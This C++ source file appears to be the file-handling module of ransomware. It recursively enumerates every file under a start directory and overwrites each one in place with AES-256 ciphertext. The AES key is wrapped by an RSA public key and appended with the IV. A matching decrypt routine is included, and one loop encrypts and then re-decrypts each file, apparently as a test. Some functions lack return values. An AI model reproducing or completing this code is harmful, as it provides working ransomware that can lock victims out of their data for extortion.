#include "FileManager.h"
#include "External/base64.h"

#include <filesystem>
#include <iostream>

bool File::FilePathExists() {
    return std::filesystem::exists(Serialization::BytestringToString(this->m_Metadata.path));
}

std::string File::ReadFrom() {
    std::string output = "";

    if ( !FilePathExists() )
        return output;

    std::ifstream file(Serialization::BytestringToString(this->m_Metadata.path), std::ifstream::binary);
    
    std::stringstream contents;
    contents << file.rdbuf();
    output = contents.str();
    file.close();

    this->m_Metadata.contents = Serialization::SerializeString(output);

    return output;
}

bool File::WriteTo(std::string& data) {
    if ( !FilePathExists() )
        return false;

    std::ofstream file(Serialization::BytestringToString(this->m_Metadata.path), std::ofstream::binary | std::ofstream::trunc);
    file.write(data.c_str(), data.size());
    file.flush();

    this->m_Metadata.contents = Serialization::SerializeString(data);

    return true;
}

void FileManager::FindFiles(std::string& startDirectory) {
    if ( !std::filesystem::exists(startDirectory) )
        return;

    for ( auto& dir : std::filesystem::recursive_directory_iterator(startDirectory) ) {
        std::string path = dir.path().string();
        File file(path);
        this->m_FileList.push_back(file);
    }
}

void FileManager::OutputFoundFiles(RSA* tempPriv) {
    for ( File& file : this->m_FileList ) {
        EncryptContents(file);
        Sleep(500);
        DecryptContents(file, tempPriv);
    }
}

bool FileManager::EncryptContents(File& file) {
    BYTESTRING AESKey          = LGCrypto::Generate256AESKey();
    BYTESTRING AESIV           = LGCrypto::GenerateAESIV();
    BYTESTRING AESKeyEncrypted = LGCrypto::RSAEncrypt(AESKey, this->m_RSAPublicKey, FALSE);
    BYTESTRING plainText       = Serialization::SerializeString(file.ReadFrom());
    
    BYTESTRING encrypted       = LGCrypto::AESEncrypt(plainText, AESKey, AESIV);
    encrypted.insert(encrypted.end(), AESKeyEncrypted.begin(), AESKeyEncrypted.end());
    encrypted.insert(encrypted.end(), AESIV.begin(), AESIV.end());

    std::string tmp = Serialization::BytestringToString(encrypted);
    file.WriteTo(tmp);
}

bool FileManager::DecryptContents(File& file, RSA* priv) {
    BYTESTRING cipherText = Serialization::SerializeString(file.ReadFrom());
    BYTESTRING AESIV(cipherText.end() - 16, cipherText.end()); cipherText.erase(cipherText.end() - 16, cipherText.end());
    BYTESTRING AESKeyEncrypted(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end()); cipherText.erase(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end());
    BYTESTRING AESKey = LGCrypto::RSADecrypt(AESKeyEncrypted, priv, TRUE);
    BYTESTRING plaintext = LGCrypto::AESDecrypt(cipherText, AESKey, AESIV);
    std::string plaintextString = Serialization::BytestringToString(plaintext);

    file.WriteTo(plaintextString);
}

const BYTESTRING FileManager::TransformFile(File& file) {
    return {};
}
